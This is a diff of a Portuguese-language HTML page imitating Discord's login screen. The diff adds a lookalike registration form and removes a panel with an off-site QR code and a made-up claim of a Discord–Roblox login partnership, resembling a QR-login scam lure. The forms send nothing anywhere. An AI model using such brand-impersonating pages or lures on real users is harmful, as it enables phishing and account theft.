@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Discord - Entrar</title>
+  <title>Discord - Entrar / Registrar</title>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
+
     body {
       font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
       background: url('image.jpg') no-repeat center center fixed;
@@ -22,65 +23,78 @@
       overflow: hidden;
       position: relative;
     }
+
     body::after {
       content: "";
       position: absolute;
       inset: 0;
-      background: rgba(0, 0, 0, 0.40); /* escurece mais um pouco se precisar */
+      background: rgba(0, 0, 0, 0.40);
       pointer-events: none;
       z-index: 1;
     }
+
     .container {
-      display: flex;
       width: 90%;
-      max-width: 1100px;
-      height: 85vh;
-      max-height: 700px;
-      background: rgba(30, 30, 50, 0.80);
+      max-width: 480px;
+      min-height: 600px;
+      background: rgba(30, 30, 50, 0.85);
       border-radius: 12px;
-      overflow: hidden;
+      padding: 40px 50px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.7);
       backdrop-filter: blur(10px);
       position: relative;
       z-index: 2;
+      overflow: hidden;
     }
-    .left {
-      flex: 1;
-      padding: 60px 80px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
+
+    .form-wrapper {
+      transition: all 0.6s ease-in-out;
+      opacity: 1;
+      transform: translateY(0);
+      position: absolute;
+      width: calc(100% - 100px);
+      top: 0;
+      left: 50px;
     }
-    .right {
-      flex: 1;
-      background: rgba(54, 57, 63, 0.92);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px;
+
+    .form-wrapper.hidden {
+      opacity: 0;
+      transform: translateY(40px);
+      pointer-events: none;
     }
-    h1 {
-      font-size: 2.2rem;
-      margin-bottom: 8px;
+
+    .logo {
       text-align: center;
+      margin-bottom: 20px;
+      font-size: 2.8rem;
+      font-weight: bold;
+      color: #5865f2;
     }
-    p.subtitle {
+
+    h1 {
+      text-align: center;
+      font-size: 1.9rem;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
       color: #b9bbbe;
       text-align: center;
-      margin-bottom: 40px;
-      font-size: 1.1rem;
+      margin-bottom: 32px;
+      font-size: 1.05rem;
     }
+
     label {
       display: block;
-      margin-bottom: 8px;
+      margin: 20px 0 6px;
       font-size: 0.9rem;
       color: #b9bbbe;
       font-weight: 600;
     }
-    input {
+
+    input, select {
       width: 100%;
-      padding: 14px;
-      margin-bottom: 12px;
+      padding: 12px 14px;
       background: #202225;
       border: 1px solid #2f3136;
       border-radius: 4px;
@@ -88,24 +102,51 @@
       font-size: 1rem;
       outline: none;
     }
-    input:focus {
+
+    input:focus, select:focus {
       border-color: #5865f2;
       box-shadow: 0 0 0 2px rgba(88,101,242,0.3);
     }
-    .forgot-link {
-      color: #00aff4;
-      font-size: 0.9rem;
-      text-decoration: none;
-      display: block;
-      margin-bottom: 24px;
-      text-align: left;
+
+    .birth-date {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
     }
-    .forgot-link:hover {
+
+    .birth-date select {
+      flex: 1;
+    }
+
+    .checkbox {
+      margin: 20px 0;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      font-size: 0.9rem;
+      color: #b9bbbe;
+    }
+
+    .terms {
+      margin-top: 16px;
+      font-size: 0.85rem;
+      color: #b9bbbe;
+      text-align: center;
+    }
+
+    .terms a {
+      color: #00aff4;
+      text-decoration: none;
+    }
+
+    .terms a:hover {
       text-decoration: underline;
     }
+
     button {
       width: 100%;
       padding: 14px;
+      margin-top: 20px;
       background: #5865f2;
       color: white;
       border: none;
@@ -114,122 +155,152 @@
       font-weight: 600;
       cursor: pointer;
       transition: background 0.2s;
-      margin-bottom: 16px;
     }
+
     button:hover {
       background: #4752c4;
     }
-    .register-link {
+
+    .link {
       text-align: center;
+      margin-top: 24px;
       font-size: 0.95rem;
-      color: #b9bbbe;
     }
-    .register-link a {
+
+    .link a {
       color: #00aff4;
       text-decoration: none;
-      font-weight: 600;
+      cursor: pointer;
     }
-    .register-link a:hover {
+
+    .link a:hover {
       text-decoration: underline;
     }
-    .qr-section {
-      text-align: center;
-      color: white;
-      max-width: 320px;
-    }
-    .qr-image {
-      width: 240px;
-      height: 240px;
-      margin: 20px auto 16px;
-      border-radius: 12px;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
-      background: white;
-      padding: 10px;
-      object-fit: contain;
-    }
-    .qr-title {
-      font-size: 1.4rem;
-      font-weight: 700;
-      margin-bottom: 16px;
-    }
-    .qr-custom-text {
-      font-size: 1.1rem;
-      font-weight: 600;
-      line-height: 1.4;
-      margin: 0 0 20px 0;
-    }
-    .logos {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-    }
-    .logos img {
-      height: 50px;
-      width: auto;
-      object-fit: contain;
-    }
-    .voltar {
-      position: absolute;
-      top: 20px;
-      left: 20px;
+
+    .forgot {
       color: #00aff4;
+      font-size: 0.9rem;
       text-decoration: none;
-      font-weight: bold;
-      z-index: 3;
+      display: block;
+      margin: 12px 0 24px;
+      text-align: left;
     }
-    @media (max-width: 900px) {
-      .container { flex-direction: column; height: auto; }
-      .right { padding: 60px 20px; }
-      .left { padding: 40px 30px; }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    /* Animação de entrada do formulário de registro */
+    .form-wrapper.register {
+      opacity: 0;
+      transform: translateY(-30px);
+    }
+
+    .form-wrapper.register.active {
+      opacity: 1;
+      transform: translateY(0);
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <div class="left">
-      <a href="#" class="voltar">&lt; Voltar</a>
-      
+
+    <!-- Formulário de LOGIN -->
+    <div id="loginForm" class="form-wrapper">
+      <div class="logo">Discord</div>
       <h1>Boas-vindas de volta!</h1>
       <p class="subtitle">Estamos muito animados em te ver novamente!</p>
-      
+
       <form>
-        <label for="email">E-mail ou número de telefone *</label>
-        <input type="text" id="email" placeholder="" required />
-        
-        <label for="senha">Senha *</label>
-        <input type="password" id="senha" placeholder="" required />
-        
-        <a href="#" class="forgot-link">Esqueceu sua senha?</a>
-        
+        <label for="email-login">E-mail ou número de telefone *</label>
+        <input type="text" id="email-login" required />
+
+        <label for="senha-login">Senha *</label>
+        <input type="password" id="senha-login" required />
+
+        <a href="#" class="forgot">Esqueceu sua senha?</a>
+
         <button type="submit">Entrar</button>
-        
-        <div class="register-link">
-          Precisando de uma conta? <a href="#">Registre-se</a>
+
+        <div class="link">
+          Precisando de uma conta? <a id="goToRegister">Registre-se</a>
         </div>
       </form>
     </div>
-    
-    <div class="right">
-      <div class="qr-section">
-        <img class="qr-image" src="https://result.ghiblivideo.ai/output/result/202602/22/260d087ebb2a4245a2a0e28c0b9ddb9d.png" alt="QR customizado" />
-        
-        <div class="qr-title">Entrar com código QR</div>
-        
-        <p class="qr-custom-text">
-          Ou faça login pelo roblox!!<br>
-          Estamos fazendo parceria em troca de divulgação!!
-        </p>
-        
-        <div class="logos">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Discord-logo-icon.jpg" alt="Discord Logo">
-          <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
+
+    <!-- Formulário de REGISTRO (inicia escondido) -->
+    <div id="registerForm" class="form-wrapper register">
+      <div class="logo">Discord</div>
+      <h1>Criar uma conta</h1>
+
+      <form>
+        <label for="email-reg">E-mail *</label>
+        <input type="email" id="email-reg" required placeholder="exemplo@exemplo.com" />
+
+        <label for="displayname">Nome exibido</label>
+        <input type="text" id="displayname" placeholder="Como os outros vão te ver" />
+
+        <label for="username">Nome de usuário *</label>
+        <input type="text" id="username" required placeholder="seuusername" />
+
+        <label for="senha-reg">Senha *</label>
+        <input type="password" id="senha-reg" required />
+
+        <label>Data de nascimento *</label>
+        <div class="birth-date">
+          <select required>
+            <option value="">Dia</option>
+            <!-- Pode preencher com JS se quiser -->
+            <option>1</option><option>2</option><!-- ... até 31 -->
+          </select>
+          <select required>
+            <option value="">Mês</option>
+            <option>Janeiro</option><option>Fevereiro</option><!-- ... -->
+          </select>
+          <select required>
+            <option value="">Ano</option>
+            <option>2025</option><option>2024</option><!-- ... -->
+          </select>
         </div>
-      </div>
+
+        <div class="checkbox">
+          <input type="checkbox" id="newsletter" />
+          <label for="newsletter">(Opcional) Tudo bem me mandar e-mails com atualizações do Discord, dicas e ofertas especiais. Você pode mudar isso a qualquer momento.</label>
+        </div>
+
+        <div class="terms">
+          Ao clicar em "Criar conta", você concorda com os <a href="#">termos de serviço</a> do Discord e confirma que leu a <a href="#">política de privacidade</a>.
+        </div>
+
+        <button type="submit">Criar conta</button>
+
+        <div class="link">
+          Já tem uma conta? <a id="goToLogin">Entrar</a>
+        </div>
+      </form>
     </div>
+
   </div>
+
+  <script>
+    const loginForm = document.getElementById('loginForm');
+    const registerForm = document.getElementById('registerForm');
+
+    document.getElementById('goToRegister').addEventListener('click', () => {
+      loginForm.classList.add('hidden');
+      setTimeout(() => {
+        registerForm.classList.add('active');
+      }, 400); // tempo sincronizado com a transição de saída
+    });
+
+    document.getElementById('goToLogin').addEventListener('click', () => {
+      registerForm.classList.remove('active');
+      setTimeout(() => {
+        loginForm.classList.remove('hidden');
+      }, 400);
+    });
+  </script>
 
 </body>
 </html>
